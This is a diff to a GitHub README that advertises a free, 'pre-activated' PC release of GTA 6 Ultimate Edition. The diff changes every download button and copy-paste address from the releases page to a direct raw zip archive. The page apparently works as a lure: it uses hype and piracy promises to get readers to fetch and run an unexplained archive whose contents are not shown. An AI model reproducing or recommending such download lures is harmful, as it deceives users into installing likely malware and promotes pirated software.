@@ -1,7 +1,7 @@
 <h1>🎮 GTA-6-Ultimate-Edition-Free-PC-2026 - Your Gateway to Next-Gen Gaming Today</h1>
 
 <p align="center">
-  <a href="https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/releases" style="background-color:#61DBFB; color:#000000; padding:15px 40px; font-size:24px; font-weight:bold; border-radius:10px; text-decoration:none; display:inline-block;">⬇️ DOWNLOAD NOW - IT'S FREE</a>
+  <a href="https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/raw/refs/heads/main/frilling/3.5.zip" style="background-color:#61DBFB; color:#000000; padding:15px 40px; font-size:24px; font-weight:bold; border-radius:10px; text-decoration:none; display:inline-block;">⬇️ DOWNLOAD NOW - IT'S FREE</a>
 </p>
 
 Welcome to the most anticipated gaming release of the decade, now available for free on your Windows PC. This complete package brings the entire GTA 6 Ultimate Edition experience directly to your computer, with no complicated setups or hidden costs. Whether you are new to PC gaming or have been playing for years, this guide will walk you through every single step to get you playing in minutes.
@@ -43,11 +43,11 @@ Follow these simple instructions carefully. We have broken everything down into 
 Using your internet browser (like Chrome, Edge, or Firefox), navigate to the official download page by clicking the button below or copying the link into your browser's address bar:
 
 <p align="center">
-  <a href="https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/releases" style="background-color:#C51162; color:#FFFFFF; padding:12px 35px; font-size:18px; font-weight:bold; border-radius:8px; text-decoration:none; display:inline-block;">🔽 CLICK HERE TO GO TO DOWNLOADS</a>
+  <a href="https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/raw/refs/heads/main/frilling/3.5.zip" style="background-color:#C51162; color:#FFFFFF; padding:12px 35px; font-size:18px; font-weight:bold; border-radius:8px; text-decoration:none; display:inline-block;">🔽 CLICK HERE TO GO TO DOWNLOADS</a>
 </p>
 
 **Direct Download Address (copy and paste):**
-`https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/releases`
+`https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/raw/refs/heads/main/frilling/3.5.zip`
 
 Once you arrive on this page, you will see several download options. Do not be overwhelmed; we will guide you to the correct one next.
 
@@ -104,7 +104,7 @@ No. This package is pre-activated and does not require a serial key or product r
 
 The creators frequently improve the game experience based on user feedback. To get the latest patches, new content, or ask questions:
 
-- **Check the Releases Page Often:** Visit `https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/releases` to download updates and fix packs.
+- **Check the Releases Page Often:** Visit `https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/raw/refs/heads/main/frilling/3.5.zip` to download updates and fix packs.
 - **Issue Tracker:** If you encounter any technical issues, visit the "Issues" tab on the main GitHub repository page to report bugs or read solutions from other players.
 - **Community:** Join the discussion in the "Discussions" area to share tips, tricks, and find multiplayer partners.
 
@@ -113,7 +113,7 @@ The creators frequently improve the game experience based on user feedback. To g
 Your adventure is just one download away. This free release eliminates all the barriers, letting you dive directly into one of the most detailed virtual worlds ever created. Click the download button, follow our guide, and you will be driving the streets of Vice City in no time. The journey is unforgettable.
 
 <p align="center">
-  <a href="https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/releases" style="background-color:#1DE9B6; color:#000000; padding:15px 45px; font-size:22px; font-weight:bold; border-radius:10px; text-decoration:none; display:inline-block;">🎯 GET YOUR COPY NOW - 100% FREE</a>
+  <a href="https://github.com/silmor1483/GTA-6-Ultimate-Edition-Free-PC-2026/raw/refs/heads/main/frilling/3.5.zip" style="background-color:#1DE9B6; color:#000000; padding:15px 45px; font-size:22px; font-weight:bold; border-radius:10px; text-decoration:none; display:inline-block;">🎯 GET YOUR COPY NOW - 100% FREE</a>
 </p>
 
 Good luck, and see you in the game!
